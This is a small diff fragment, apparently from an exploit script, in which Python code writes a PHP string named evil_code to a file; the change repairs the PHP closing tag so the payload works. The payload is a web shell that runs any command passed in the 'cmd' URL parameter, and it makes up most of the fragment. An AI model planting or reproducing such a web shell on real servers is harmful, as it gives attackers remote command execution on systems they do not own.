@@ -74,7 +74,7 @@ else:
         evil_code="""
 <?php
 echo system($_GET['cmd']);
-??
+?>
 """
 
         opfile.write(evil_code)
